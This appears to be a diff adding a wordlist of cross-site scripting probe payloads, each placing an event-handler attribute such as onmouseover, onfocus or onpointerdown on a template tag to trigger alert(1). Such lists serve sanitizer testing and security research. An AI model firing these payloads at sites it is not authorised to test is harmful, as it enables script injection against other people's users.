@@ -1,0 +1,43 @@
+<template draggable="true" ondrag="alert(1)">test</template>
+<template draggable="true" ondragend="alert(1)">test</template>
+<template draggable="true" ondragenter="alert(1)">test</template>
+<template draggable="true" ondragleave="alert(1)">test</template>
+<template draggable="true" ondragstart="alert(1)">test</template>
+<template id=x tabindex=1 onactivate=alert(1)></template>
+<template id=x tabindex=1 onbeforeactivate=alert(1)></template>
+<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>
+<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>
+<template id=x tabindex=1 onfocus=alert(1)></template>
+<template id=x tabindex=1 onfocusin=alert(1)></template>
+<template onafterscriptexecute=alert(1)><script>1</script>
+<template onbeforecopy="alert(1)" contenteditable>test</template>
+<template onbeforecut="alert(1)" contenteditable>test</template>
+<template onbeforepaste="alert(1)" contenteditable>test</template>
+<template onbeforescriptexecute=alert(1)><script>1</script>
+<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>
+<template onclick="alert(1)">test</template>
+<template oncontextmenu="alert(1)">test</template>
+<template oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<template oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<template ondblclick="alert(1)" autofocus tabindex=1>test</template>
+<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>
+<template onkeydown="alert(1)" contenteditable>test</template>
+<template onkeypress="alert(1)" contenteditable>test</template>
+<template onkeyup="alert(1)" contenteditable>test</template>
+<template onmousedown="alert(1)">test</template>
+<template onmouseenter="alert(1)">test</template>
+<template onmouseleave="alert(1)">test</template>
+<template onmousemove="alert(1)">test</template>
+<template onmouseout="alert(1)">test</template>
+<template onmouseover="alert(1)">test</template>
+<template onmouseup="alert(1)">test</template>
+<template onmousewheel=alert(1)>requires scrolling
+<template onpaste="alert(1)" contenteditable>test</template>
+<template onpointerdown=alert(1)>XSS</template>
+<template onpointerenter=alert(1)>XSS</template>
+<template onpointerleave=alert(1)>XSS</template>
+<template onpointermove=alert(1)>XSS</template>
+<template onpointerout=alert(1)>XSS</template>
+<template onpointerover=alert(1)>XSS</template>
+<template onpointerrawupdate=alert(1)>XSS</template>
+<template onpointerup=alert(1)>XSS</template>
